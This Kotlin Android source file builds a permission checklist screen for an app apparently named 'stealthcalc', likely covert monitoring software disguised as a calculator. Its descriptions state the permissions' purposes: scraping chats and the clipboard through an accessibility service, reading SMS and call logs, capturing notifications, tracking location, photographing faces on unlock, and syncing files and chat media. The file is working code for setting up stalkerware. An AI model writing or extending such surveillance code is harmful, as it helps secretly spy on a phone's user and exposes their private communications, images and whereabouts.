package com.stealthcalc.monitoring.ui

import android.Manifest
import android.app.AppOpsManager
import android.app.usage.UsageStatsManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.provider.Settings
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Error
import androidx.compose.material3.Button
import androidx.compose.material3.HorizontalDivider
import androidx.compose.material3.Icon
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat

data class PermissionStatus(
    val name: String,
    val description: String,
    val granted: Boolean,
    val openSettings: ((Context) -> Unit)? = null,
)

fun checkAllPermissions(context: Context): List<PermissionStatus> = buildList {
    add(PermissionStatus(
        name = "Usage Access",
        description = "Needed for app usage monitoring",
        granted = hasUsageStatsPermission(context),
        openSettings = { ctx ->
            ctx.startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    ))

    add(PermissionStatus(
        name = "Notification Access",
        description = "Needed for notification capture",
        granted = isNotificationListenerEnabled(context),
        openSettings = { ctx ->
            ctx.startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    ))

    add(PermissionStatus(
        name = "Accessibility Service",
        description = "Needed for chat scraping + clipboard",
        granted = isAccessibilityServiceEnabled(context),
        openSettings = { ctx ->
            ctx.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
        }
    ))

    add(PermissionStatus(
        name = "Location",
        description = "Needed for WiFi SSID + location tracking",
        granted = ContextCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED,
    ))

    add(PermissionStatus(
        name = "Call Log",
        description = "Needed for call history",
        granted = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED,
    ))

    add(PermissionStatus(
        name = "SMS",
        description = "Needed for text message content",
        granted = ContextCompat.checkSelfPermission(context, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED,
    ))

    add(PermissionStatus(
        name = "Camera",
        description = "Needed for face capture on unlock",
        granted = ContextCompat.checkSelfPermission(context, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED,
    ))

    add(PermissionStatus(
        name = "All Files Access",
        description = "Needed for file sync + chat media",
        granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Environment.isExternalStorageManager() else true,
        openSettings = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) { ctx ->
            runCatching {
                ctx.startActivity(
                    Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                        .setData(Uri.parse("package:${ctx.packageName}"))
                        .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                )
            }
        } else null,
    ))

    add(PermissionStatus(
        name = "Notifications",
        description = "Needed for foreground service notification",
        granted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
        else true,
    ))
}

private fun hasUsageStatsPermission(context: Context): Boolean {
    val appOps = context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
    val mode = appOps.unsafeCheckOpNoThrow(
        AppOpsManager.OPSTR_GET_USAGE_STATS,
        android.os.Process.myUid(),
        context.packageName
    )
    return mode == AppOpsManager.MODE_ALLOWED
}

private fun isNotificationListenerEnabled(context: Context): Boolean {
    val flat = Settings.Secure.getString(context.contentResolver, "enabled_notification_listeners")
    return flat?.contains(context.packageName) == true
}

private fun isAccessibilityServiceEnabled(context: Context): Boolean {
    val serviceName = ComponentName(context, "com.stealthcalc.monitoring.service.AccessibilityMonitorService")
    val flat = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
    return flat?.contains(serviceName.flattenToString()) == true
}

@Composable
fun PermissionChecklist() {
    val context = LocalContext.current
    val permissions = checkAllPermissions(context)
    val granted = permissions.count { it.granted }

    Column(modifier = Modifier.fillMaxWidth()) {
        Text(
            "$granted / ${permissions.size} permissions granted",
            style = MaterialTheme.typography.labelLarge,
            color = MaterialTheme.colorScheme.primary,
            modifier = Modifier.padding(horizontal = 16.dp, vertical = 12.dp)
        )

        permissions.forEach { perm ->
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(horizontal = 16.dp, vertical = 6.dp),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.spacedBy(12.dp),
            ) {
                Icon(
                    if (perm.granted) Icons.Default.CheckCircle else Icons.Default.Error,
                    contentDescription = null,
                    modifier = Modifier.size(20.dp),
                    tint = if (perm.granted) Color(0xFF4CAF50) else MaterialTheme.colorScheme.error,
                )
                Column(modifier = Modifier.weight(1f)) {
                    Text(perm.name, style = MaterialTheme.typography.bodyMedium)
                    Text(perm.description, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onBackground.copy(alpha = 0.5f))
                }
                if (!perm.granted && perm.openSettings != null) {
                    Button(
                        onClick = { perm.openSettings.invoke(context) },
                    ) {
                        Text("Grant", style = MaterialTheme.typography.labelSmall)
                    }
                }
            }
        }

        HorizontalDivider(modifier = Modifier.padding(vertical = 8.dp))
    }
}
